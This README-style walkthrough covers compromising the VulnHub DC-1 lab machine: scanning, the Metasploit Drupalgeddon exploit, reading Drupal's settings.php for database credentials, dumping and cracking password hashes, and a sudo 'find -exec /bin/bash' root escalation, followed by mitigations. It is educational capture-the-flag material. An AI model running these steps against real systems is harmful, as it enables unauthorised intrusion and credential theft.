<p align="center">
  <img src="https://img.shields.io/badge/Platform-VulnHub-red?style=for-the-badge&logo=linux&logoColor=white" />
  <img src="https://img.shields.io/badge/Difficulty-Beginner-brightgreen?style=for-the-badge" />
  <img src="https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" />
  <img src="https://img.shields.io/badge/CMS-Drupal-0678BE?style=for-the-badge&logo=drupal&logoColor=white" />
  <img src="https://img.shields.io/badge/Status-Rooted%20🏴-black?style=for-the-badge" />
</p>

<h1 align="center">
  🔓 DC‑1 — Full Compromise Walkthrough
</h1>

<p align="center">
  <i>From reconnaissance to root — a beginner-friendly boot2root journey.</i>
</p>

<p align="center">
  <a href="#-reconnaissance">Recon</a> •
  <a href="#-initial-foothold">Foothold</a> •
  <a href="#-post-exploitation">Post-Exploitation</a> •
  <a href="#-password-cracking">Cracking</a> •
  <a href="#-privilege-escalation">PrivEsc</a> •
  <a href="#-flags-captured">Flags</a> •
  <a href="#-lessons-learned">Lessons</a>
</p>

---

## 🧠 Skills Demonstrated

| Skill | Description |
|:------|:------------|
| 🔍 Network Recon | Host discovery & port scanning |
| 🌐 Web Enumeration | Fingerprinting CMS & web server |
| 💉 CMS Exploitation | Drupalgeddon Remote Code Execution |
| 🗄️ DB Credential Extraction | Harvesting creds from config files |
| 🔑 Hash Cracking | Drupal 7 SHA-512 hash cracking |
| 🪜 Privilege Escalation | Sudo misconfiguration abuse |

---

## 🗺️ Attack Flow

```
┌──────────────┐     ┌─────────────────┐     ┌────────────────────┐
│  Recon &      │────▶│  Exploit Drupal  │────▶│  Post-Exploitation │
│  Enumeration  │     │  (Drupalgeddon)  │     │  Enumeration       │
└──────────────┘     └─────────────────┘     └────────┬───────────┘
                                                       │
                     ┌─────────────────┐     ┌─────────▼───────────┐
                     │  Privilege       │◀────│  Credential Harvest │
                     │  Escalation      │     │  & Hash Cracking    │
                     │  ➜ ROOT 🏴       │     └─────────────────────┘
                     └─────────────────┘
```

---

## 🔍 Reconnaissance

### Host Discovery

```bash
netdiscover -r 192.168.241.1/24
```

> **Target acquired** → `192.168.241.144`

### Port & Service Scan

```bash
nmap -sV 192.168.241.144
```

| Port | State | Service | Version |
|:----:|:-----:|:--------|:--------|
| 80 | `open` | HTTP | Apache (Drupal CMS) |

### Web Vulnerability Scan

```bash
nikto -h 192.168.241.144
```

> [!NOTE]
> **Key Findings:** Port 80 open, Apache web server hosting **Drupal CMS**.

---

## 💥 Initial Foothold

The target was vulnerable to **Drupalgeddon** — a critical Remote Code Execution (RCE) vulnerability in Drupal.

### Exploitation via Metasploit

```bash
msfconsole
```

```
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(drupal_drupageddon) > set RHOSTS 192.168.241.144
msf6 exploit(drupal_drupageddon) > exploit
```

### Shell Stabilization

```bash
# Drop into an interactive shell
shell

# Upgrade to a fully interactive TTY
python -c 'import pty; pty.spawn("/bin/bash")'
```

> [!TIP]
> Always stabilize your shell after initial access for a smoother post-exploitation experience.

---

## 🕵️ Post-Exploitation

### 🚩 Flag 1 — Web Root

```bash
cat /var/www/flag1.txt
```

> **Flag 1** found in the default document root.

### Database Credentials

Drupal's configuration file leaked sensitive database credentials:

```bash
cat /var/www/sites/default/settings.php
```

Extracted:
- 🗄️ **Database name**
- 👤 **Database username**
- 🔒 **Database password**

### Dumping User Hashes

```bash
mysql -u dbuser -p
```

```sql
USE drupaldb;
SELECT name, pass FROM users;
```

> Drupal password hashes extracted successfully.

---

## 🔑 Password Cracking

The extracted hashes began with `$S$`, indicating **Drupal 7 (SHA-512 based)** hashing.

```bash
john --format=drupal7 hash.txt
```

> [!IMPORTANT]
> Password **cracked** successfully via John the Ripper.

---

## 🪜 Privilege Escalation

### Identifying System Users

```bash
cat /etc/passwd | grep bash
```

> Valid Linux user identified: `flag4`

### Lateral Movement

```bash
su flag4
# Enter cracked password
```

### 🚩 Flag 4 — User Home

```bash
cat /home/flag4/flag4.txt
```

### Sudo Misconfiguration

```bash
sudo -l
```

```
User flag4 may run the following commands on DC-1:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

> [!CAUTION]
> **Critical misconfiguration detected.** The `find` binary can execute arbitrary commands as root — **game over.**

### Root Exploit

```bash
sudo find . -exec /bin/bash \;
```

### 🏴 Verification

```bash
whoami
# root

cat /root/thefinalflag.txt
```

> **Full system compromise achieved.** 🎉

---

## 🚩 Flags Captured

| # | Flag | Location |
|:-:|:-----|:---------|
| 🚩 1 | `flag1.txt` | `/var/www/` |
| 🚩 4 | `flag4.txt` | `/home/flag4/` |
| 🏴 Final | `thefinalflag.txt` | `/root/` |

---

## 📚 Lessons Learned

> _"It's not the single vulnerability that creates the breach — it's the chain."_

### 🔴 Vulnerabilities Identified

| Issue | Impact | Mitigation |
|:------|:-------|:-----------|
| Outdated CMS (Drupal) | Remote Code Execution | Patch management & timely updates |
| Plaintext DB credentials in config | Credential theft | Restrict file permissions, use secrets management |
| Credential reuse across services | Lateral movement | Unique credentials per service |
| Sudo misconfiguration | Full privilege escalation | Apply principle of least privilege |
| No monitoring / detection | Undetected compromise | Implement IDS/IPS & logging |

### 💡 Key Takeaways

```
  ┌─────────────────────────────────────────────────────────┐
  │                    DEFENSE IN DEPTH                      │
  │                                                         │
  │   🛡️  Patch Management     — Keep software updated      │
  │   🔐  Credential Hygiene   — No reuse, no plaintext     │
  │   🚪  Access Controls      — Least privilege always     │
  │   📊  Monitoring           — Detect before it's too late│
  │   🧱  Segmentation         — Limit blast radius         │
  │                                                         │
  └─────────────────────────────────────────────────────────┘
```

---

<p align="center">
  <b>⚠️ Disclaimer</b><br/>
  <i>This writeup is for <b>educational purposes only</b>. Always obtain proper authorization before testing systems you do not own.</i>
</p>

<p align="center">
  Made with ☕ and curiosity &nbsp;|&nbsp; <b>Happy Hacking 🏴‍☠️</b>
</p>
